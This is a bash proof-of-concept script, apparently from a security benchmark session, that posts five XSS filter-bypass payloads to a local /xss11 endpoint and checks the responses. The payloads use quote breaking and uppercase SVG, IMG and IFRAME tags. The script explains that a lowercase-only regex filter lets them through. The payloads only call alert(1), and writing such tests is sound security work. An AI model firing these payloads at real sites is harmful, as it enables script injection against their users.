#!/bin/bash
# POC: Demonstrates XSS filter bypass on /xss11 endpoint using uppercase HTML tags and quote injection to circumvent inadequate regex filtering
# Target: ./repo
# Created: 2025-11-05T17:01:07.142Z
# Session: benchmark-XBEN-012-24-mhm7ivyh

# XSS Filter Bypass POC - Testing /xss11 endpoint
# This script demonstrates how uppercase HTML tags and quote injection
# can bypass the inadequate input validation filters

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/xss11"

echo "=========================================="
echo "XSS Filter Bypass POC - Uppercase Tags"
echo "=========================================="
echo "Target: $TARGET_URL$ENDPOINT"
echo ""

# Test 1: Quote breaking to inject attributes
echo "[*] Test 1: Quote breaking with onload attribute"
PAYLOAD='\" onload=alert(1) \"'
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT" -d "msg=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response contains XSS payload: $(echo "$RESPONSE" | grep -q 'onload=alert' && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Full response excerpt:"
echo "$RESPONSE" | grep -o 'value="[^"]*"' | head -1
echo ""

# Test 2: Uppercase SVG tag
echo "[*] Test 2: Uppercase SVG tag with onload"
PAYLOAD='<SVG onload=alert(1)>'
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT" -d "msg=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response contains SVG tag: $(echo "$RESPONSE" | grep -qi '<SVG\|<svg' && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Response contains onload: $(echo "$RESPONSE" | grep -q 'onload=alert' && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Full response excerpt:"
echo "$RESPONSE" | grep -o 'value="[^"]*"' | head -1
echo ""

# Test 3: Uppercase IMG tag
echo "[*] Test 3: Uppercase IMG tag with onerror"
PAYLOAD='<IMG SRC=x onerror=alert(1)>'
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT" -d "msg=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response contains IMG tag: $(echo "$RESPONSE" | grep -qi '<IMG' && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Response contains onerror: $(echo "$RESPONSE" | grep -q 'onerror=alert' && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Full response excerpt:"
echo "$RESPONSE" | grep -o 'value="[^"]*"' | head -1
echo ""

# Test 4: Autofocus with onfocus
echo "[*] Test 4: Autofocus with onfocus attribute"
PAYLOAD='\" autofocus onfocus=\"alert(1)\" \"'
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT" -d "msg=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response contains autofocus: $(echo "$RESPONSE" | grep -q 'autofocus' && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Response contains onfocus: $(echo "$RESPONSE" | grep -q 'onfocus=alert' && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Full response excerpt:"
echo "$RESPONSE" | grep -o 'value="[^"]*"' | head -1
echo ""

# Test 5: Uppercase IFRAME tag
echo "[*] Test 5: Uppercase IFRAME tag"
PAYLOAD='<IFRAME src=javascript:alert(1)></IFRAME>'
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT" -d "msg=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response contains IFRAME tag: $(echo "$RESPONSE" | grep -qi '<IFRAME' && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Response contains javascript: $(echo "$RESPONSE" | grep -q 'javascript:alert' && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Full response excerpt:"
echo "$RESPONSE" | grep -o 'value="[^"]*"' | head -1
echo ""

echo "=========================================="
echo "POC Summary: Testing filter effectiveness"
echo "=========================================="
echo ""

# Detailed filter test - show what the filter actually removes
echo "[*] Testing regex filter effectiveness:"
echo ""
echo "Filter regex 1: r'\"\"\"[\\\"']XSS[\\\"']\"\"\"'"
echo "Filter regex 2: r'\"\"\"<[a-z/]\"\"\"' - VULNERABLE: Only matches lowercase!"
echo ""
echo "The second regex [a-z/] does NOT match:"
echo "  - Uppercase letters (A-Z)"
echo "  - Numbers (0-9)"
echo "  - Special characters except forward slash"
echo ""
echo "This allows payloads to bypass the filter:"
echo "  - <SVG ...> (uppercase S, V, G not matched by [a-z])"
echo "  - <IMG ...> (uppercase I, M, G not matched by [a-z])"
echo "  - \" onload= \" (quote break escapes value attribute)"
echo ""

exit 0